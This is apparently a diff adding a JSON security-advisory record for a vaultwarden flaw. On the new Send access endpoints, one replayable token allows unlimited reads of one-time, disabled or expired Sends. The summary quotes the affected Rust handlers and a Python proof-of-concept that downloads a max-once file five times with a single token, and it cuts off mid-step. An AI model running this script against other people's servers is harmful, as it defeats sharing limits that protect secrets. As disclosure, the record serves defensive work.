@@ -1,0 +1,50 @@
+{
+  "id": "GHSA-wc45-m6pv-rrf9",
+  "aliases": [],
+  "title": "Send access limits not enforced on the new Send access endpoints",
+  "summary": "### Summary\r\n\r\n> **Pre-release only.** The affected code was only on the development branch (and the `:testing` image) between commits `5c5e8e1a` (#7346) and `46ae59ea` (#7472). It was never part of a tagged release: 1.36.0 predates it and 1.37.0 shipped with the fix.\r\n\r\nThe anonymous Send access endpoints introduced by the 2026.6.0 rewrite do not enforce a Send's access limits. Anyone holding a Send link can read a \"one-time\" (or `max_access_count=N`) Send many more times than allowed, and can keep reading it after the creator disables it or it expires. Meanwhile the creator's access counter under-reports the real number of reads. The `max_access_count`, `expiration_date`, `deletion_date`, and `disabled` guarantees of Send are effectively defeated.\r\n\r\n### Details\r\n\r\nThe rewrite split anonymous access into two steps: get a 2-minute `send_access` token (`POST /identity/connect/token`, `grant_type=send_access`), then read the Send with it (`POST /api/sends/access` for text, `POST /api/sends/access/file/<file_id>` for files).\r\n\r\nAll limit enforcement was moved into token **issuance**. `SendTokens::generate_tokens` (`src/auth/send.rs:82-117`) checks `max_access_count`/`expiration_date`/`deletion_date`/`disabled`/password and does `access_count += 1` **once** (`:116`). The access handlers `process_access` (`src/api/core/sends.rs:516`) and `process_access_file` (`:592`) then re-check **nothing** and **never** increment `access_count`:\r\n\r\n```rust\r\n// src/api/core/sends.rs:592 (no checks, no increment)\r\nasync fn process_access_file(send: Send, file_id: SendFileId, host: Host, conn: DbConn, nt: Notify<'_>) -> JsonResult {\r\n    nt.send_send_update(...).await;\r\n    Ok(Json(json!({ \"url\": download_url(&host, &send.uuid, &file_id).await? })))\r\n}\r\n// The legacy handlers, retained in the same file (sends.rs:557-585), still check\r\n// expiration/deletion/disabled/password and do `send.access_count += 1` on every access.\r\n```\r\n\r\nThe `send_access` JWT (`BasicJwtClaims`) has no `jti`/nonce, so it is a replayable bearer for its full 2-minute lifetime. Consequences:\r\n\r\n- `access_count` counts **tokens issued, not reads**, so a `max_access_count=N` Send yields N tokens, each granting unlimited reads in its window, and the creator's `accessCount` shows only N.\r\n- A Send **disabled or expired mid-window stays readable** through an already-issued token.\r\n\r\n### PoC\r\n\r\nCreate a **File Send** with **Maximum Access Count = 1** in your vault. Set `SEND_ID` (its UUID, from the share link), `FILE_ID` (from `GET /api/sends`), and `VW` (your server), then run:\r\n\r\n```python\r\nimport json, os, base64, uuid, urllib.request, urllib.error, urllib.parse\r\nBASE, SEND_ID, FILE_ID = os.environ[\"VW\"], os.environ[\"SEND_ID\"], os.environ[\"FILE_ID\"]\r\n\r\ndef http(method, path, hdr=None, form=None):\r\n    body = urllib.parse.urlencode(form).encode() if form else None\r\n    h = {\"User-Agent\": \"vw1\"} | (hdr or {})\r\n    if form: h[\"Content-Type\"] = \"application/x-www-form-urlencoded\"\r\n    try:  r = urllib.request.urlopen(urllib.request.Request(BASE + path, body, h, method=method), timeout=30); return r.status, r.read()\r\n    except urllib.error.HTTPError as e: return e.code, e.read()\r\n\r\nsid = base64.urlsafe_b64encode(uuid.UUID(SEND_ID).bytes).decode().rstrip(\"=\")\r\n_, b = http(\"POST\", \"/identity/connect/token\", form={\"grant_type\": \"send_access\", \"client_id\": \"web\", \"send_id\": sid})\r\ntok = {\"Authorization\": \"Bearer \" + json.loads(b)[\"access_token\"]}          # the ONE access the max=1 Send allows\r\ns, _ = http(\"POST\", \"/identity/connect/token\", form={\"grant_type\": \"send_access\", \"client_id\": \"web\", \"send_id\": sid})\r\nprint(f\"[1] 2nd token issuance -> HTTP {s} (blocked: the max=1 cap fires only here, at issuance)\")\r\nfor i in range(1, 6):                                                        # ...yet ONE token reads the file 5x\r\n    s, _ = http(\"POST\", f\"/api/sends/access/file/{FILE_ID}\", hdr=tok)\r\n    print(f\"[2] download #{i} -> HTTP {s}\")\r\ninput(\"[3] now Disable the Send in your vault...",
+  "published_at": "2026-10-03T20:58:42.000Z",
+  "modified_at": "2026-10-03T21:02:33.000Z",
+  "severity": {
+    "level": "medium",
+    "score": 5.3,
+    "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "source": "ghsa"
+  },
+  "kev": {
+    "listed": false,
+    "added_at": null,
+    "checked": true
+  },
+  "epss": null,
+  "cwes": [
+    "CWE-863"
+  ],
+  "affected": [
+    {
+      "product": "vaultwarden",
+      "ranges": [
+        {
+          "introduced": "1.36.0",
+          "fixed": "1.37.0"
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-wc45-m6pv-rrf9",
+      "type": "advisory"
+    }
+  ],
+  "sources": [
+    {
+      "type": "ghsa",
+      "id": "GHSA-wc45-m6pv-rrf9",
+      "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-wc45-m6pv-rrf9",
+      "license": "CC-BY-4.0"
+    }
+  ],
+  "revision": "sha256:cb287f4752a83f058666227d5fcf5cff1f9d159ebe6163a9494d5f66f7ff4d21",
+  "note": null
+}
